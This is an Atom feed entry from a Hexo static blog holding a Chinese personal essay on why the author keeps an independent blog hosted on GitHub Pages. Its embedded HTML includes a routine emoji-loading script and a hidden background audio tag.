    <content type="html"><![CDATA[<p></p><blockquote class="blockquote-center">这是最好的时代，也是最坏的时代。<br>这是智慧的时代，也是愚蠢的时代。<br>这是信任的时代，也是怀疑的时代。<br>这是光明的季节，亦是黑暗的季节。<br>这是希望之暖春，亦是失望之隆冬。<br>我们拥有着一切，我们也一无所有。<br>人人向往着天堂，人人通往着地狱。<br>—— 狄更斯《双城记》</blockquote><br><a id="more"></a><p></p><h1 id="独立博客作为知识备份"><a href="#独立博客作为知识备份" class="headerlink" title="独立博客作为知识备份"></a>独立博客作为知识备份</h1><p>这是一个知识爆炸的时代，正如狄更斯在《双城记》中所言，“这是最好的时代，也是最坏的时代”，自媒体的兴起，人人都是写手，都是发言人。这本来是好事，对于新事物不应该断然否定。<br>汇集于网上的公开课，各种教程，眼花缭乱。知识的门槛降低了，获取知识的途径，除了传统的读书识记外，网络这把双刃剑，若能合理运用，对于知识能力的提升也是有好处的。<br>我将本博客寄存与Github上，它提供了Github Page的功能，可以很方便的搭建属于自己的私人博客。花钱每个域名，只要不是特别常见的，通常都很便宜（我的这个域名在腾讯买的，首年只要一块钱）。正因为这只一个知识爆炸的时代，所以在获取、索要知识之余，整理复习便显得尤为重要。我将我学到的知识点，或是新悟出来的技巧，写下来，记到博客上面，也算是一个备份。</p><h1 id="独立博客的灵活性更大"><a href="#独立博客的灵活性更大" class="headerlink" title="独立博客的灵活性更大"></a>独立博客的灵活性更大</h1><p>除了独立博客，各大平台的第三方博客同样可以做只是备份，我之所以选择独立博客，还有一个原因，即相比于后者，独立博客的灵活性更大。本博客采用Hexo框架和Next主题搭建，它们的源码都托管在Github上面，我可以直接看它的源码，直接从源码级别对网站修改。还有人前端厉害点且时间充裕的，不需要别人的框架和主题，完全可以自己写一个博客。当然也可以像我一样直接用别人写好的框架，选择和选择之间通常没有优劣之分。我没有选择WordPress、Typecho这样封装得比较好的博客系统，因为它需要购买ECS，而用 Hexo（或者Jekyll）搭建，源码托管在Github上面，完全不用自己掏钱。另一方面，Hexo对应的是静态博客，而 Wordpress、Typecho，它们是动态博客，虽然可能在外观上后者更上一筹（我的博客也不算丑吧，我想），但是静态博客有一个天生的优势，那就是速度，静态博客的访问速度还是挺快的，追求极致一点，稍微优化下，几乎就是秒开。对于一个有点极简思想的人来说，这是我最喜欢的了（效率高）。除此之外，SEO、安全性和稳定性方面，静态博客总的来所也是强于动态博客的。所以我选择Hexo搭建我的独立博客，Hexo的创造者是中国台湾人，文档读起来也舒服。<br>我选择了Next主题，先声明我绝对不是在人云亦云跟风（Next 主题目前而言，人气还是相当高的，和别的主题比起来的话）。在尝试了Yilia、Suka以及默认的landspace主题后，我还是选择了Next主题，不是说别的主题不好，毕竟仁者见仁，智者见智，适合自己的才是最好的。</p><h1 id="独立博客让我有归属感"><a href="#独立博客让我有归属感" class="headerlink" title="独立博客让我有归属感"></a>独立博客让我有归属感</h1><p>以前在CSDN上面写博客，感觉自己就是在为别人写字。虽然都有自己的独立博客空间，但是那毕竟是别人的。最坑爹的是，写的文章还要审核，这是我最不能容忍的。在第三方博客平台写字，好处就是不用自己维护，不用自己掏钱，别人什么都帮你搞好了，坏处就是，我没有归属感，觉得自己在被别人管！！这很讨厌。我是一个自由独立的思想者，不是被迫工作的机器。被人管着，嗯……虽然人家嘴上没说什么，但是毕竟事实就是这样。<br>被别人管着，我就无法集中在精神，更无法做一些创造性的工作。这样的后果是十分严重的，我以前已经吃过这样的亏了，现在，还有以后，务必以史为鉴。<br>而在独立博客上写字，感觉这就是我的地盘，我就是这里的主宰，我的域名，我的文字，我的代码……唯一不足的就是，代码还是托管在别人那里，这点暂且记着，以后总会有办法的。；）<br>此外从隐私保护的角度看，独立博客比平台博客安全，没有什么账号密码的绑定，在我的独立博客范围内一切似乎都是可控的，都是可以由我的意识而随心改变的。喜欢。</p><h1 id="独立博客是独立的"><a href="#独立博客是独立的" class="headerlink" title="独立博客是独立的"></a>独立博客是独立的</h1><p>这不是废话，独立博客是独立的。试想自己写作的博客平台突然破产倒闭了，那上面的博文怎搞？数据无价，这是要转移的，而如果是自己的私人独立博客，则不存在这样的事情。网易博客的倒闭，已经让我意识到了一些东西，我不希望把自己的知识财富寄托于别人的平台，如果别人死了，那我的博客凭什么也要一起死？不喜欢，那种感觉，肯定不好过，不同于寄人篱下的悲苦，唯有自己动手，方能丰衣足食。<br>独立博客是独立的，不但从物理上将，对我而言，在精神上也是如此。没有了寄人篱下的精神枷锁，我可以随心所欲的写，我的思想，我的文字。这种感觉好，我喜欢。</p><p>这是一个知识共享的时代，却也是一个知识产权的时代，什么都讲究隐私，都讲究权益，科技为我们带来了便利的同时，也希望自己不要忘记初心……</p><audio src="/uploads/yesterday_once_more.mp3" loop="true" autoplay="true" hidden="true"></audio><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;这是最好的时代，也是最坏的时代。&lt;br&gt;这是智慧的时代，也是愚蠢的时代。&lt;br&gt;这是信任的时代，也是怀疑的时代。&lt;br&gt;这是光明的季节，亦是黑暗的季节。&lt;br&gt;这是希望之暖春，亦是失望之隆冬。&lt;br&gt;我们拥有着一切，我们也一无所有。&lt;br&gt;人人向往着天堂，人人通往着地狱。&lt;br&gt;—— 狄更斯《双城记》&lt;/blockquote&gt;&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="https://celestialcode.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
</feed>
